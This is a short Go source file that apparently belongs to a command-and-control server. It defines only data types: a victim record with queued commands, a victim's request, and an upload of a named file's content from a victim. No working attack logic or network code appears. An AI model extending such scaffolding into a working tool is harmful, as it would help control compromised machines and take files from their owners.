package main

//"bufio"
//"bytes"
//"encoding/base64"
//"encoding/json"
//"fmt"
//"io"
//"net/http"
//"path/filepath"
//"runtime"
//"strings"
//"github.com/olekukonko/tablewriter"

//put json formats of messages here

// type IncomingClientDataPacket struct {
// 	FromHash        string //who was this from?
// 	GeneratorSource string //what generated this data
// 	Data            string //dump of the data
// 	//other stuff as needed

// }

type VictimInfo struct {
	Hash     string
	Commands []VictimCommand
}

// storage structure for victim commands
type VictimCommand struct {
	Commandytype string
	Arguments    []string
}

type IncomingVictimRequest struct {
	RequesterHash string //who is making this request
}

type IncomingSuperCatData struct {
	Hash     string
	Filename string
	Content  string // base64 or raw content
}




